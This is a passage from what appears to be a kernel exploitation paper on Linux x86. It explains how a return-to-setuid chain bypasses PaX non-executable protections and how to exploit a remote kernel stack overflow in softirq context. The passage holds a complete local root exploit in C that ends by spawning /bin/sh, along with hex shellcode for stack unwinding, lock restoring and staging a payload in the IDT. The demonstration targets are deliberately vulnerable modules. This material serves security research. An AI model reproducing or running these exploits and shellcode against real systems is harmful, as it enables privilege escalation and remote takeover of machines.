At [1] the current process task_struct is taken from the kernel stack
value. At [2] the %ebx value is copied over the 'euid' and 'fsuid' members
of the struct. We have our return address, which is [1]. 
At that point we need to force somehow %ebx into being 0 (if we're not
lucky enough to have it already zero'ed).

To demonstrate this vulnerability we have used the local exploitable
buffer overflow in dummy.c driver (KERN_IOCTL_STORE_CHUNK ioctl()
command). Since it's a stack based overflow we can chain multiple return
address preparing a fake stack frame that we totally control. 
We need : 

 - a zero'ed %ebx : the easiest way to achieve that is to find a pop %ebx
   followed by a ret instruction [we control the stack] : 

	ret-to-pop-ebx:
		[*] c0100cd3:       5b      pop    %ebx
		[*] c0100cd4:       c3      ret
    
   we don't strictly need pop %ebx directly followed by ret, we may find a
   sequence of pops before the ret (and, among those, our pop %ebx). It is
   just a matter of preparing the right ZERO-layout for the pop sequence
   (to make it simple, add a ZERO 4-bytes sequence for any pop between the
   %ebx one and the ret)    

 - the return addr where to jump, which is the [1] address shown above

 - a 'ret-to-ret' padding to take care of the stack gap created at [3] by
   the function epilogue (%esp adding and register popping) :
	
	ret-to-ret pad:
		[*] 0xffffe413      c3      ret 

   (we could have used the above ret aswell, this one is into vsyscall
    page and was used in other exploit where we didn't need so much
    knowledge of the kernel .text.. it survived here :) )

 - the address of an iret instruction to return to userland (and a crafted
   stack frame for it, as we described above while discussing 'Stack
   Based' explotation) :

	ret-to-iret:
		[*] c013403f:       cf      iret


Putting all together this is how our 'stack' should look like to perform a
correct explotation :

low addresses
            +----------------+
            | ret-to-ret pad |
            | ret-to-ret pad |
            | .............. |
            | ret-to-pop ebx |
            | 0x00000000     |
            | ret-to-setuid  |
            | ret-to-ret pad |
            | ret-to-ret pad |
            | ret-to-ret pad |
            | .............  |
            | .............  |
            | ret-to-iret    |
            | fake-iret-frame|
            +----------------+
high addresses


Once correctly returned to userspace we have successfully modified 'fsuid'
and 'euid' value, but our 'ruid' is still the original one. At that point
we simply re-exec ourselves to get euid=0 and then spawn the shell. 
Code follows :

< stuff/expl/grsec_noexec.c >

#include <sys/ioctl.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

#include "dummy.h"

#define DEVICE "/dev/dummy"
#define NOP 0x90
#define PAGE_SIZE 0x1000
#define STACK_SIZE 8192
//#define STACK_SIZE 4096


#define STACK_MASK ~(STACK_SIZE -1)
/* patch it at runtime */


#define ALTERNATE_STACK 0x00BBBBBB

/*2283d*/
#define RET_INTO_RET_STR   "\x3d\x28\x02\x00"
#define DUMMY              RET_INTO_RET_STR
#define ZERO               "\x00\x00\x00\x00"

/* 22ad3 */
#define RET_INTO_POP_EBX   "\xd3\x2a\x02\x00"
/* 1360 */
#define RET_INTO_IRET      "\x60\x13\x00\x00"
/* 227fc */
#define RET_INTO_SETUID    "\xfc\x27\x02\x00"

// do_eip at .text offset (rivedere)
// 0804864f
#define USER_CODE_OFFSET   "\x4f\x86\x04\x08"
#define USER_CODE_SEGMENT  "\x73\x00\x00\x00"
#define USER_EFLAGS        "\x46\x02\x00\x00"
#define USER_STACK_OFFSET  "\xbb\xbb\xbb\x00"
#define USER_STACK_SEGMENT "\x7b\x00\x00\x00"


/* sys_setuid - grsec kernel */
/*
   227fc:       89 e2                   mov    %esp,%edx
   227fe:       89 f1                   mov    %esi,%ecx
   22800:       81 e2 00 e0 ff ff       and    $0xffffe000,%edx
   22806:       8b 02                   mov    (%edx),%eax
   22808:       89 98 50 01 00 00       mov    %ebx,0x150(%eax)
   2280e:       89 98 58 01 00 00       mov    %ebx,0x158(%eax)
   22814:       8b 02                   mov    (%edx),%eax
   22816:       89 fa                   mov    %edi,%edx
   22818:       89 a8 54 01 00 00       mov    %ebp,0x154(%eax)
   2281e:       c7 44 24 18 01 00 00    movl   $0x1,0x18(%esp)
   22825:       00
   22826:       8b 04 24                mov    (%esp),%eax
   22829:       5d                      pop    %ebp
   2282a:       5b                      pop    %ebx
   2282b:       5e                      pop    %esi
   2282c:       5f                      pop    %edi
   2282d:       5d                      pop    %ebp
   2282e:       e9 ef d5 0c 00          jmp    efe22
<cap_task_post_setuid>
   22833:       83 ca ff                or     $0xffffffff,%edx
   22836:       89 d0                   mov    %edx,%eax
   22838:       5f                      pop    %edi
   22839:       5b                      pop    %ebx
   2283a:       5e                      pop    %esi
   2283b:       5f                      pop    %edi
   2283c:       5d                      pop    %ebp
   2283d:       c3                      ret

*/

/* pop %ebx, ret grsec
 *
 * ffd1a884:       5b                      pop    %ebx
 * ffd1a885:       c3                      ret
 */

char *g_prog_name;

char kern_noexec_shellcode[] =
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_POP_EBX
ZERO
RET_INTO_SETUID
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_POP_EBX
RET_INTO_POP_EBX
RET_INTO_POP_EBX
RET_INTO_POP_EBX
RET_INTO_POP_EBX
RET_INTO_POP_EBX
RET_INTO_POP_EBX
RET_INTO_POP_EBX
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_IRET
USER_CODE_OFFSET
USER_CODE_SEGMENT
USER_EFLAGS
USER_STACK_OFFSET
USER_STACK_SEGMENT
;


void re_exec(int useless)
{
  char *a[3] = { g_prog_name, "exec", NULL };
  execve(g_prog_name, a, NULL);
}


char *allocate_jump_stack(unsigned int jump_addr, unsigned int size)
{
  unsigned int round_addr = jump_addr & 0xFFFFF000;
  unsigned int diff       = jump_addr - round_addr;
  unsigned int len        = (size + diff + 0xFFF) & 0xFFFFF000;
  char *map_addr = mmap((void*)round_addr,
                        len,
                        PROT_READ|PROT_WRITE,
                        MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE,
                        0,
                        0);

  if(map_addr == (char*)-1)
    return NULL;

  memset(map_addr, 0x00, len);

  return map_addr;
}


char *allocate_jump_code(unsigned int jump_addr, void* code, unsigned int
size)
{
  unsigned int round_addr = jump_addr & 0xFFFFF000;
  unsigned int diff       = jump_addr - round_addr;
  unsigned int len        = (size + diff + 0xFFF) & 0xFFFFF000;

  char *map_addr = mmap((void*)round_addr,
                        len,
                        PROT_READ|PROT_WRITE|PROT_EXEC,
                        MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS,
                        0,
                        0);

  if(map_addr == (char*)-1)
    return NULL;

  memset(map_addr, NOP, len);
  memcpy(map_addr+diff, code, size);

  return map_addr + diff;
}


inline void patch_code_4byte(char *code, unsigned int offset, unsigned int
value)
{
  *((unsigned int *)(code + offset)) = value;
}


int main(int argc, char *argv[])
{
  if(argc > 1)
  {
    int ret;
    char *argvx[] = {"/bin/sh", NULL};
    ret = setuid(0);
    printf("euid=%d, ret=%d\n", geteuid(), ret);
    execve("/bin/sh", argvx, NULL);
    exit(1);
  }

  signal(SIGSEGV, re_exec);

  g_prog_name = argv[0];
  char *stack_jump =
          allocate_jump_stack(ALTERNATE_STACK, PAGE_SIZE);

  if(!stack_jump)
  {
    fprintf(stderr, "Exiting: mmap failed");
    exit(1);
  }



  char *memory = malloc(PAGE_SIZE), *mem_orig;
  mem_orig = memory;

  memset(memory, 0xDD, PAGE_SIZE);


  struct device_io_ctl *ptr = (struct device_io_ctl*)memory;
  ptr->chunk_num = 9 + (sizeof(kern_noexec_shellcode)-1)/sizeof(struct
device_io_blk) + 1;
  printf("Chunk num: %d\n", ptr->chunk_num);
  ptr->type = 0xFFFFFFFF;

  memory += (sizeof(struct device_io_ctl) + sizeof(struct device_io_blk) *
9);

  /* copy shellcode */
  memcpy(memory, kern_noexec_shellcode, sizeof(kern_noexec_shellcode)-1);

  int i, fd = open(DEVICE,  O_RDONLY);
  if(fd < 0)
    return 0;

  ioctl(fd, KERN_IOCTL_STORE_CHUNK, (unsigned long)mem_orig);
  return 0;
}

< / >


As we said, we have chosen the PaX security patches for Linux/x86, but
some of the theory presented equally works well in other situation. 
A slightly different exploiting approach was successfully used on
Solaris/SPARC. (we leave it as an 'exercise' for the reader ;)) 

  
---[ 3.2 - Remote Kernel Exploiting 


Writing a working and somehow reliable remote kernel exploit is an
exciting and interesting challenge. Keeping on with the 'style' of this
paper we're going to propose here a couple of tecniques and 'life notes'
that leaded us into succeeding into writing an almost reliable, image
independant and effective remote exploit.

After the first draft of this paper, a couple of things changed, so some
of the information presented here could be outdated in the very latest
kernels (and compiler releases), but are anyway a good base for the
tractation (we've added notes all around this chapter about changes and
updates into the recent releases of the linux kernel).

A couple of the ideas presented here converged into a real remote exploit
for the madwifi remote kernel stack buffer overflow [21], that we already
released [22], without examining too much in detail the explotation
approaches used. This chapter can be thus seen both as the introduction
and the extension of that work. 
More precisely we will cover here also the exploiting issues and solution
when dealing with code running in interrupt context, which is the most
common running mode for network based code (interrupt handler, softirq,
etc) but which wasn't the case for the madwifi exploit.
The same ideas apply well to kernel thread context too.

Explotation tecniques and discussion is based on stack based buffer
overflow on the Linux 2.6.* branch of kernels on the x86 architecture, but
can be reused in most of the conditions that lead us to take control over 
the instruction flow.


------[ 3.2.1 - The Network Contest 


We begin with a few considerations about the typology of kernel code that 
we'll be dealing with. Most of that code runs in interrupt context (and
sometimes in a kernel thread context), so we have some 'limitations' :

  - we can't directly 'return-to-userspace', since we don't have a valid 
    current task pointer. Moreover, most of times, we won't control the
    address space of the userland process we talk with. Netherless we can
    relay on some 'fixed' points, like the ELF header (given there's no
    PIE / .text randomization on the remote box)

  - we can't perform any action that might make the kernel path to sleep
    (for example a memory fault access)

  - we can't directly call a system call 
 
  - we have to take in account kernel resource management, since such kind
    of kernel paths usually acquire spinlocks or disables pre-emption. We
    have to restore them in a stable state.

Logically, since we are from remote, we don't have any information about
structs or kernel paths addresses, so, since a good infoleaking is usually
a not very probable situation, we can't rely on them. 

We have prepared a crafted example that will let us introduce all the
tecniques involved to solve the just stated problems. We choosed to write
a netfilter module, since quite a lot of the network kernel code depends
on it and it's the main framework for third part modules. 

< stuff/drivers/linux/remote/dummy_remote.c >

#define MAX_TWSKCHUNK 30
#define TWSK_PROTO    37

struct twsk_chunk
{
  int type;
  char buff[12];
};

struct twsk
{
  int chunk_num;
  struct twsk_chunk chunk[0];
};


static int process_twsk_chunk(struct sk_buff *buff)
{
  struct twsk_chunk chunks[MAX_TWSKCHUNK];

  struct twsk *ts = (struct twsk *)((char*)buff->nh.iph +
(buff->nh.iph->ihl * 4));

  if(ts->chunk_num > MAX_TWSKCHUNK)                                   [1]                               
    return (NF_DROP);

  printk(KERN_INFO "Processing TWSK packet: packet frame n. %d\n",
ts->chunk_num);

memcpy(chunks, ts->chunk, sizeof(struct twsk_chunk) * ts->chunk_num); [2] 

  // do somethings..

  return (NF_ACCEPT);

}

< / >


We have a signedness issue at [1], which triggers a later buffer overflow
at [2], writing past the local 'chunks' buffer. 
As we just said, we must know everything about the vulnerable function,
that is, when it runs, under which 'context' it runs, what calls what, how
would the stack look like, if there are spinlocks or other control 
management objects acquired, etc.

A good starting point is dumping a stack trace at calling time of our
function :

#1  0xc02b5139 in nf_iterate (head=0xc042e4a0, skb=0xc1721ad0, hook=0, [1]
    indev=0xc1224400, outdev=0x0, i=0xc1721a88,
    okfn=0xc02bb150 <ip_rcv_finish>, hook_thresh=-2147483648)
    at net/netfilter/core.c:89
#2  0xc02b51b9 in nf_hook_slow (pf=2, hook=1, pskb=0xc1721ad0,         [2] 
    indev=0xc1224400, outdev=0x0, okfn=0xc02bb150 <ip_rcv_finish>,
    hook_thresh=-2147483648) at net/netfilter/core.c:125
#3  0xc02baee3 in ip_rcv (skb=0xc1bc4a40, dev=0xc1224400, pt=0xc0399310,
    orig_dev=0xc1224400) at net/ipv4/ip_input.c:348
#4  0xc02a5432 in netif_receive_skb (skb=0xc1bc4a40) at
net/core/dev.c:1657
#5  0xc024d3c2 in rtl8139_rx (dev=0xc1224400, tp=0xc1224660, budget=64)
    at drivers/net/8139too.c:2030
#6  0xc024d70e in rtl8139_poll (dev=0xc1224400, budget=0xc1721b78)
    at drivers/net/8139too.c:2120
#7  0xc02a5633 in net_rx_action (h=0xc0417078) at net/core/dev.c:1739
#8  0xc0118a75 in __do_softirq () at kernel/softirq.c:95
#9  0xc0118aba in do_softirq () at kernel/softirq.c:129                [3]
#10 0xc0118b7d in irq_exit () at kernel/softirq.c:169
#11 0xc0104212 in do_IRQ (regs=0xc1721ad0) at arch/i386/kernel/irq.c:110
#12 0xc0102b0a in common_interrupt () at current.h:9
#13 0x0000110b in ?? ()
 
Our vulnerable function (just like any other hook) is called serially by
the nf_iterate one [1], during the processing of a softirq [3], through
the netfilter core interface nf_hook_slow [2]. 
It is installed in the INPUT chain and, thus, it starts processing packets
whenever they are sent to the host box, as we see from [2] where pf = 2
(PF_INET) and hook = 1 (NF_IP_LOCAL_IN). 

Our final goal is to execute some kind of code that will estabilish a
connection back to us (or bind a port to a shell, or whatever kind of
shellcoding you like more for your remote exploit). Trying to execute it
directly from kernel land is obviously a painful idea so we need to hijack
some userland process (remember that we are on top of a softirq, so we
have no clue about what's really beneath us; it could equally be a kernel
thread or the idle task, for example) as our victim, to inject some code
inside and force the kernel to call it later on, when we're out of an
asyncronous event.

That means that we need an intermediary step between taking the control
over the flow at 'softirq time' and execute from the userland process. 
But let's go on order, first of all we need to _start executing_ at least
the entry point of our shellcode. 

As it is nowadays used in many exploit that have to fight against address
space randomization in the absence of infoleaks, we look for a jump to a 
jmp *%esp or push reg/ret or call reg sequence, to start executing from a
known point.
To avoid guessing the right return value a nop-alike padding of
ret-into-ret addresses can be used. But we still need to find those
opcodes in a 'fixed' and known place.

The 2.6. branch of kernel introduced a fixed page [*] for the support of
the 'sysenter' instruction, the 'vsyscall' one :

bfe37000-bfe4d000 rwxp bfe37000 00:00 0          [stack]
ffffe000-fffff000 ---p 00000000 00:00 0          [vdso]

which is located at a fixed address : 0xffffe000 - 0xfffff000. 

[*] At time of release this is no more true on latest kernels, since the
    address of the vsyscall page is randomized starting from the 2.6.18 
    kernel. 
 
The 'vsyscall' page is a godsend for our 'entry point' shellcode, since we
can locate inside it the required opcodes [*] to start executing : 

(gdb) x/i 0xffffe75f
0xffffe75f:     jmp    *%esp
(gdb) x/i 0xffffe420
0xffffe420:     ret

[*] After testing on a wide range of kernels/compilers the addresses of 
    those opcodes we discovered that sometimes they were not in the
    expected place or, even, in one case, not present. This could be the
    only guessing part you could be facing (also due to vsyscall
    randomization, as we said in the note before), but there are
    (depending on situations) other possibilities [fixed start of the
    kernel image, fixed .text of the 'running process' if out of interrupt 
    context, etc].

To better figure out how the layout of the stack should be after the
overflow, here there's a small schema :

+-------------+
|             |
|             |
| JMP -N      |-------+     # N is the size of the buffer plus some bytes
|             |       |       (ret-to-ret chain + jmp space)
|             |       |
| ret-to-jmp  |<-+    |     # the address of the jmp *%esp inside vsyscall
|             |  |    |
| .........   | -+    |
|             |  |    |
| ret-to-ret  | -+    |     # the address of 'ret' inide vsyscall 
|             |  |    |
| ret-to-ret  | -+    |
|             |       |
| overwritten |       |     # ret-to-ret padding starting from there
| ret address |       |
|             |       |
|             |       |
|      ^      |       |
|      |      |       |     # shellcode is placed inside the buffer
|             |       |       because it's huge, but it could also be
|  shellcode  |       |       splitted before and after the ret addr.
|   nop       |       |
|   nop       |<------+
+-------------+
 
    
At that point we control the flow, but we're still inside the softirq, so
we need to perform a couple of tasks to cleanly get our connect back
shellcode executed :

  - find a way to cleanly get out from the softirq, since we trashed the 
    stack 
  - locate the resource management objects that have been modified (if
    the've been) and restore them to a safe state
  - find a place where we can store our shellcode untill later execution 
    from a 'process context' kernel path.
  - find a way to force the before mentioned kernel path to execute our
    shellcode

The first step is the most difficult one (and wasn't necessary in the
madwifi exploit, since we weren't in interrupt context), because we've
overwritten the original return pointer and we have no clue about the
kernel text layout and addresses.

We're going now to present tecniques and a working shellcode for each one
of the above points. [ Note that we have mentioned them in a 'conceptual
order of importance', which is different from the real order that we use
inside the exploit. More precisely, they are almost in reverse order,
since the last step performed by our shellcode is effectively getting out
from the softirq. We felt that approach more well-explanatory, just
remember that note during the following sub-chapters] 


------[ 3.2.2 - Stack Frame Flow Recovery   

 
The goal of this tecnique is to unroll the stack, looking for some known
pattern and trying to reconstruct a caller stack frame, register status
and instruction pointing, just to continue over with the normal flow. 
We need to restore the stack pointer to a known and consistent state,
restore register contents so that the function flow will exit cleanily and
restore any lock or other syncronization object that was modified by the
functions among the one we overflowed in and the one we want to 'return
to'. 

Our stack layout (as seen from the dump pasted above) would basically be
that one :

stack layout
+---------------------+   bottom of stack
|                     |
| do_softirq()        |
| ..........          |             /* nf_hook_slow() stack frame */
| ..........          |             +------------------------+
|                     |             |  argN                  |
|                     |             |  ...                   |
| ip_rcv              |             |  arg2                  |
| nf_hook_slow        | =========>  |  arg1                  |
| ip_rcv_finish       |             |  ret-to-(ip_rcv())     |
| nf_iterate          |             |  saved reg1            |
|                     |             |  saved reg2            |
|                     |             |  ......                |
| ..............      |             +------------------------+
| ..............      |
| process_twsk_chunk  |
|                     |
+---------------------+  top of stack


As we said, we need to locate a function in the previous stack frames, not
too far from our overflowing one, having some 'good pattern' that would
help us in our search.
Our best bet, in that situation, is to check parameter passing : 

#2  0xc02b51b9 in nf_hook_slow (pf=2, hook=1, pskb=0xc1721ad0,
indev=0xc1224400, outdev=0x0, ....)

The 'nf_hook_slow()' function has a good 'signature' :              

  -  two consecutive dwords 0x00000002 and 0x00000002
  -  two kernel pointers (dword > 0xC0000000)
  -  a following NULL dword

We can relay on the fact that this pattern would be a constant, since
we're in the INPUT chain, processing incoming packets, and thus always
having a NULL 'outdev', pf = 2 and hook = 1.
Parameters passing is logically not the only 'signature' possible :
depending on situations you could find a common pattern in some local
variable (which would be even a better one, because we discovered that
some versions of GCC optimize out some parameters, passing them through
registers). 

Scanning backward the stack from the process_twsk_chunk() frame up to
the nf_hook_slow() one, we can later set the %esp value to the place where 
is saved the return address of nf_hook_slow(), and, once recreated the 
correct conditions, perform a 'ret' that would let us exit cleanily.
We said 'once recreated the correct conditions' because the function could
expect some values inside registers (that we have to set) and could expect
some 'lock' or 'preemption set' different from the one we had at time of
overflowing. Our task is thus to emulate/restore all those requirements.

To achieve that, we can start checking how gcc restores registers during
function epilogue :

c02b6b30 <nf_hook_slow>:
c02b6b30:       55                      push   %ebp
c02b6b31:       57                      push   %edi
c02b6b32:       56                      push   %esi
c02b6b33:       53                      push   %ebx
[...]
c02b6bdb:       89 d8                   mov    %ebx,%eax
c02b6bdd:       5a                      pop    %edx       ==+
c02b6bde:       5b                      pop    %ebx         |
c02b6bdf:       5e                      pop    %esi         | restore
c02b6be0:       5f                      pop    %edi         |
c02b6be1:       5d                      pop    %ebp        =+
c02b6be2:       c3                      ret

This kind of epilogue, which is common for non-short functions let us
recover the state of the saved register. Once we have found the 'ret'
value on the stack we can start 'rolling back' counting how many 'pop' are
there inside the text to correctly restore those register. [*]

[*] This is logically not the only possibility, one could set directly the
    values via movl, but sometimes you can't use 'predefined' values for
    those register. As a side note, some versions of the gcc compiler
    don't use the push/pop prologue/epilogue, but translate the code as a
    sequence of movl (which need a different handling from the shellcode).      
 
To correctly do the 'unrolling' (and thus locate the pop sequence), we
need the kernel address of 'nf_hook_slow()'. This one is not hard to
calculate since we have already found on the stack its return addr (thanks
to the signature pointed out before). Once again is the intel calling
procedures convention which help us :

[...]
c02bc8bd:       6a 02                   push   $0x2
c02bc8bf:       e8 6c a2 ff ff          call   c02b6b30 <nf_hook_slow>
c02bc8c4:       83 c4 1c                add    $0x1c,%esp
[...]

That small snippet of code is taken from ip_rcv(), which is the function
calling nf_hook_slow(). We have found on the stack the return address,
which is 0xc02bc8c4, so calculating the nf_hook_slow address is just a
matter of calculating the 'displacement' used in the relative call (opcode
0xe8, the standard calling convention on kernel gcc-compiled code) and
adding it to the return addr value (INTEL relative call convention adds
the displacement to the current EIP) : 

[*] call to nf_hook_slow -> 0xe8 0x6c 0x2a 0xff 0xff 
[*] nf_hook_slow address -> 0xc02bc8c4 + 0xffffa26c = 0xc02b6b30 

To better understand the whole Stack Frame Flow Recovery approach here's
the shellcode stub doing it, with short comments :

 - Here we increment the stack pointer with the 'pop %eax' sequence and
   test for the known signature [ 0x2 0x1 X X 0x0 ].

loop:
"\x58"                  // pop    %eax
"\x83\x3c\x24\x02"      // cmpl   $0x2,(%esp)
"\x75\xf9"              // jne    loop
"\x83\x7c\x24\x04\x01"  // cmpl   $0x1,0x4(%esp)
"\x75\xf2"              // jne    loop
"\x83\x7c\x24\x10\x00"  // cmpl   $0x0,0x10(%esp)
"\x75\xeb"              // jne    loop
"\x8d\x64\x24\xfc"      // lea    0xfffffffc(%esp),%esp
  
 - get the return address, subtract 4 bytes and deference the pointer to get
   the nf_hook_slow() offset/displacement. Add it to the return address to
   obtain the nf_hook_slow() address. 

"\x8b\x04\x24"          // mov    (%esp),%eax
"\x89\xc3"              // mov    %eax,%ebx
"\x03\x43\xfc"          // add    0xfffffffc(%ebx),%eax

 - locate the 0xc3 opcode inside nf_hook_slow(), eliminating 'spurious'
   0xc3 bytes. In this shellcode we do a simple check for 'movl' opcodes
   and that's enough to avoid 'false positive'. With a larger shellcode
   one could write a small disassembly routine that would let perform a
   more precise locating of the 'ret' and 'pop' [see later]. 

increment:
"\x40"                  // inc    %eax
"\x8a\x18"              // mov    (%eax),%bl
"\x80\xfb\xc3"          // cmp    $0xc3,%bl
"\x75\xf8"              // jne    increment
"\x80\x78\xff\x88"      // cmpb   $0x88,0xffffffff(%eax)
"\x74\xf2"              // je     increment
"\x80\x78\xff\x89"      // cmpb   $0x89,0xffffffff(%eax)
"\x74\xec"              // je     8048351 increment

 - roll back from the located 'ret' up to the last pop instruction, if 
   any and count the number of 'pop's.  
  
pop:
"\x31\xc9"              // xor    %ecx,%ecx
"\x48"                  // dec    %eax
"\x8a\x18"              // mov    (%eax),%bl
"\x80\xe3\xf0"          // and    $0xf0,%bl
"\x80\xfb\x50"          // cmp    $0x50,%bl
"\x75\x03"              // jne    end
"\x41"                  // inc    %ecx
"\xeb\xf2"              // jmp    pop
"\x40"                  // inc    %eax

 - use the calculated byte displacement from ret to rollback %esp value

"\x89\xc6"              // mov    %eax,%esi
"\x31\xc0"              // xor    %eax,%eax
"\xb0\x04"              // mov    $0x4,%al
"\xf7\xe1"              // mul    %ecx
"\x29\xc4"              // sub    %eax,%esp

 - set the return value 

"\x31\xc0"              // xor    %eax,%eax

 - call the nf_hook_slow() function epilog
 
"\xff\xe6"              // jmp    *%esi


It is now time to pass to the 'second step', that is restore any pending
lock or other synchronization object to a consistent state for the
nf_hook_slow() function. 


---[ 3.2.3 - Resource Restoring 


At that phase we care of restoring those resources that are necessary for
the 'hooked return function' (and its callers) to cleanly get out from the
softirq/interrupt state. 

Let's take another (closer) look at nf_hook_slow() : 

< linux-2.6.15/net/netfilter/core.c >

int nf_hook_slow(int pf, unsigned int hook, struct sk_buff **pskb,
                 struct net_device *indev,
                 struct net_device *outdev,
                 int (*okfn)(struct sk_buff *),
                 int hook_thresh)
{
        struct list_head *elem;
        unsigned int verdict;
        int ret = 0;

        /* We may already have this, but read-locks nest anyway */
        rcu_read_lock();		[1]

[...]
 
unlock:
        rcu_read_unlock();		[2]
        return ret;			[3]
}

< / >

At [1] 'rcu_read_lock()' is invoked/acquired, but [2] 'rcu_read_unlock()'
is never performed, since at the 'Stack Frame Flow Recovery' step we
unrolled the stack and jumped back at [3]. 

'rcu_read_unlock()' is just an alias of preempt_enable(), which, in the 
end, results in a one-decrement of the preempt_count value inside the
thread_info struct :

< linux-2.6.15/include/linux/rcupdate.h >

#define rcu_read_lock()         preempt_disable()

[...]

#define rcu_read_unlock()       preempt_enable()

< / >

< linux-2.6.15/include/linux/preempt.h >

# define add_preempt_count(val) do { preempt_count() += (val); } while (0)
# define sub_preempt_count(val) do { preempt_count() -= (val); } while (0)

[...]

#define inc_preempt_count() add_preempt_count(1)
#define dec_preempt_count() sub_preempt_count(1)

#define preempt_count() (current_thread_info()->preempt_count)

#ifdef CONFIG_PREEMPT

asmlinkage void preempt_schedule(void);

#define preempt_disable() \
do { \
        inc_preempt_count(); \
        barrier(); \
} while (0)

#define preempt_enable_no_resched() \
do { \
        barrier(); \
        dec_preempt_count(); \
} while (0)

#define preempt_check_resched() \
do { \
        if (unlikely(test_thread_flag(TIF_NEED_RESCHED))) \
                preempt_schedule(); \
} while (0)

#define preempt_enable() \
do { \
        preempt_enable_no_resched(); \
        barrier(); \
        preempt_check_resched(); \
} while (0)

#else

#define preempt_disable()               do { } while (0)
#define preempt_enable_no_resched()     do { } while (0)
#define preempt_enable()                do { } while (0)
#define preempt_check_resched()         do { } while (0)

#endif
     
< / >   

As you can see, if CONFIG_PREEMPT is not set, all those operations are 
just no-ops. 'preempt_disable()' is nestable, so it can be called multiple
times (preemption will be disabled untill we call 'preempt_enable()' the 
same number of times). That means that, given a PREEMPT kernel, we should
find a value equal or greater to '1' inside preempt_count at 'exploit
time'. We can't just ignore that value or otherwise we'll BUG() later on
inside scheduler code (check preempt_schedule_irq() in kernel/sched.c). 

What we have to do, on a PREEMPT kernel, is thus locate 'preempt_count'
and decrement it, just like 'rcu_read_unlock()' would do. 
For the x86 architecture , 'preempt_count' is stored inside the 'struct 
thread_info' : 

< linux-2.6.15/include/asm-i386/thread_info.h >

struct thread_info {
        struct task_struct      *task;          /* main task structure */
        struct exec_domain      *exec_domain;   /* execution domain */
        unsigned long           flags;          /* low level flags */
        unsigned long           status;         /* thread-synchronous
flags */
        __u32                   cpu;            /* current CPU */
        int                     preempt_count;  /* 0 => preemptable, <0 =>
BUG */


        mm_segment_t            addr_limit;     /* thread address space:
                                                   0-0xBFFFFFFF for
user-thead
                                                   0-0xFFFFFFFF for
kernel-thread
                                                */
 
[...]

< / >

Let's see how we get to it : 

 - locate the thread_struct 

"\x89\xe0"                 // mov %esp,%eax
"\x25\x00\xe0\xff\xff"     // and $0xffffe000,%eax

 - scan the thread_struct to locate the addr_limit value. This value is a
   good fingerprint, since it is 0xc0000000 for an userland process and  
   0xffffffff for a kernel thread (or the idle task). [note that this kind 
   of scan can be used to figure out in which kind of process we are, 
   something that could be very important in some scenario] 

/* scan: */
"\x83\xc0\x04"             // add $0x4,%eax
"\x8b\x18"                 // mov (%eax),%ebx
"\x83\xfb\xff"             // cmp $0xffffffff,%ebx
"\x74\x0a"                 // je 804851e <end>
"\x81\xfb\x00\x00\x00\xc0" // cmp $0xc0000000,%ebx
"\x74\x02"                 // je 804851e <end>
"\xeb\xec"                 // jmp 804850a <scan>

 - decrement the 'preempt_count' value [which is just the member above the
   addr_limit one] 

/* end: */
"\xff\x48\xfc"             // decl 0xfffffffc(%eax)
 

To improve further the shellcode it would be a good idea to perform a test
over the preempt_count value, so that we would not end up into lowering it
below zero. 


---[ 3.2.4 - Copying the Stub 

 
We have just finished presenting a generic method to restore the stack
after a 'general mess-up' of the netfilter core call-frames. 
What we have to do now is to find some place to store our shellcode, since
we can't (as we said before) directly execute from inside interrupt
context. [remember the note, this step and the following one are executed
before getting out from the softirq context]. 

Since we don't know almost anything about the remote kernel image memory
mapping we need to find a 'safe place' to store the shellcode, that is, we
need to locate some memory region that we can for sure reference and that
won't create problems (read : Oops) if overwritten. 

There are two places where we can copy our 'stage-2' shellcode :

  - IDT (Interrupt Descriptor Table) : we can easily get the IDT logical
    address at runtime (as we saw previously in the NULL dereference
    example) and Linux uses only the 0x80 software interrupt vector : 

    +-----------------+
    | exeption        |
    |    entries      |
    |-----------------|
    |  hw interrupt   |
    |      entries    |
    |-----------------| entry #32 ==+
    |                 |             |
    |  soft interrupt |             |
    |      entries    |             | usable gap
    |                 |             |
    |                 |             |
    |                 |           ==+
    |  int 0x80       | entry #128
    |                 |
    +-----------------+ <- offset limit
 
    Between entry #32 and entry #128 we have all unused descriptor
    entries, each 8 bytes long. Linux nowadays doesn't map that memory
    area as read-only [as it should be], so we can write on it [*]. 	
    We have thus : (128 - 32) * 8 = 98 * 8 = 784 bytes, which is enough 
    for our 'stage-2 shellcode'. 

    [*] starting with the Linux kernel 2.6.20 it is possible to map some
        areas as read-only [the idt is just one of those]. Since we don't
        'start' writing into the IDT area and executing from there, it is
        possible to bypass that protection simply modifying directly
        kernel page tables protection in 'previous stages' of the
        shellcode.

  - the current kernel stack : we need to make a little assumption here,
    that is being inside a process that would last for some time (untill
    we'll be able to redirect kernel code over our shellcode, as we will
    see in the next section). 
    Usually the stack doesn't grow up to 4kb, so we have an almost free 
    4kb page for us (given that the remote system is using an 8kb stack
    space). To be safe, we can leave some pad space before the shellcode. 
    We need to take care of the 'struct thread_struct' saved at the
    'bottom' of the kernel stack (and that logically we don't want to
    overwrite ;) ) :

    +-----------------+
    | thread_struct   |
    |---------------- |  ==+
    |                 |    | usable gap
    |                 |    |
    |-----------------|  ==+
    |                 |
    |       ^         |
    |       |         |  [ normally the stack doesn't ]
    |       |         |  [ grow over 4kb              ]
    |                 |
    |  ring0 stack    |
    +-----------------+
    
    Alltogether we have : (8192 - 4096) - sizeof(descriptor) - pad ~= 2048
    bytes, which is even more than before. 
    With a more complex shellcode we can traverse the process table and
    look forward for a 'safe process' (init, some kernel thread, some main
    server process). 

Let's give a look to the shellcode performing that task : 

 - get the stack address where we are [the uber-famous call/pop trick]

"\xe8\x00\x00\x00\x00"         //  call   51 <search+0x29>
"\x59"                         //  pop    %ecx
 
